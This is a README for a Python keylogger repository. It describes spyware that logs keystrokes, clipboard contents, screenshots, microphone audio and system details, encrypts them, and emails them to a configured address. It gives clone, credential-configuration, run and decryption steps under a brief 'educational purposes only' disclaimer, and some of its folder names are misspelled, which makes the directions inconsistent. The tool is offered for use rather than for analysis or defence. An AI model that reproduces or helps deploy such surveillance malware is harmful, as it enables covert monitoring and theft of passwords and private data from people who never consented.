# Advanced Keylogger using Python

An advanced keylogger that captures keystrokes, clipboard data, screenshots, microphone audio, and system information, then sends the collected data via email.

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Disclaimer](#disclaimer)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)


## Introduction

This Python-based keylogger is designed for educational and testing purposes only. It captures various types of information from the target machine and sends the collected data to a specified email address.

## Features

- Captures keystrokes
- Records clipboard content
- Takes screenshots
- Records audio using the microphone
- Gathers system information
- Encrypts collected data
- Sends data via email


## Disclaimer

This software is intended for educational and ethical testing purposes only. Unauthorized use of this software to monitor devices without explicit permission from the device owner is illegal and unethical. The author is not responsible for any misuse of this software.


## Installation

1. Clone the repository:
    ```sh
    git clone https://github.com/sahilpokharkar/Advanced-keylogger.git
    cd Advanced-keylogger
    ```

2. Install the required dependencies:
    ```sh
    pip install -r requirements.txt
    ```


## Configuration

### Email Configuration

In the `keylogger.py` file, set your email address and password (use an app password for Gmail) to send the collected data:

```python
email_address = "your_email@gmail.com"
password = "your_app_password"
toaddr = "receiver_email@gmail.com"
file_path= "path_in_device"
```

### Encryption Key generation
In Cryptography Folder the `GenerateKey.py` generates encryption key to be used.

```sh
cd Cryptography
python GenerateKey.py
```


## Usage

1. Configure the keylogger by editing the `keylogger.py` file to set your email credentials and file paths.
2. Run the keylogger:
    ```sh
    cd Project
    python keylogger.py
    ```
3. Use `DecryptFile.py` from Cryptogarphy folder for decryption of the data.
   
   ```sh
   cd ..
   cd Crptography
   python DecryptFile.py
   ```


## Dependencies
- pywin32
- pynput
- scipy
- cryptography
- requests
- pillow
- sounddevice
